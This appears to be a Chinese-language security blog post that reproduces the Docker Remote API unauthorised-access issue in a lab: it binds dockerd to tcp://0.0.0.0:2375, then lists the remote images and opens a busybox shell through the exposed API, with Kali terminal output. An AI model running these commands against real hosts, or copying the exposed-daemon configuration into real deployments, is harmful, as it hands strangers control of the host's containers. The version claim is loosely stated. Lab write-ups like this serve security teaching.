---
title: Dcoker Remote API未授权访问漏洞
date: 2022-08-12 18:14:52
slug: docker-remote-api-vulnerability-escape
tags:
  - Docker
  - Security
categories:
  - Security
  - Container

---

## 一、漏洞说明

Docker守护进程监听IP为0.0.0.0，导致可以直接通过Docker Remote API操作Docker

## 二、影响版本

Docker version: 19.03.12 之前版本

## 三、漏洞复现

### 3.1、安装docker

```bash
sudo apt-get update

```

### 3.2、备份docker服务文件

```bash
cp /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak
```

### 3.3、修改服务文件，将docker监听IP改成0.0.0.0

```bash
vim /lib/systemd/system/docker.service	
```

```bash
# 在文件末尾加上如下代码
[Service]
ExecStart=
ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
```

### 3.4、重启守护进程和docker服务

```bash
sudo systemctl daemon-reload   # 重载守护进程
sudo service docker restart  # 重启docker服务
systemctl status docker.service   # 查看docker运行情况
```

### 3.5、漏洞检测

```bash
curl http://x.x.x.x:2375

docker -H tcp://x.x.x.x:2375 images
```

```bash
┌──(kali㉿kali)-[~]
└─$ docker -H tcp://10.0.2.15 images                        
REPOSITORY         TAG          IMAGE ID       CREATED         SIZE
flaskapp-no-root   latest       191c96d54d26   24 hours ago    126MB
flaskapp-root      latest       50d72e86aa68   24 hours ago    126MB
alpine             latest       7e01a0d0a1dc   3 days ago      7.34MB
busybox            latest       a416a98b71e2   3 weeks ago     4.26MB
ubuntu             18.04        f9a80a55f492   2 months ago    63.2MB
ubuntu             16.04        b6f507652425   23 months ago   135MB
python             3.9.5-slim   c71955050276   2 years ago     115MB

```

### 3.6、漏洞利用

```bash
docker -H tcp://x.x.x.x pull busybox
docker -H tcp://x.x.x.x run -it busybox sh
```

```bash
┌──(kali㉿kali)-[~]
└─$ docker -H tcp://10.0.2.15 run -it busybox sh
/ # 
/ # ls
bin    dev    etc    home   lib    lib64  proc   root   sys    tmp    usr    var

```

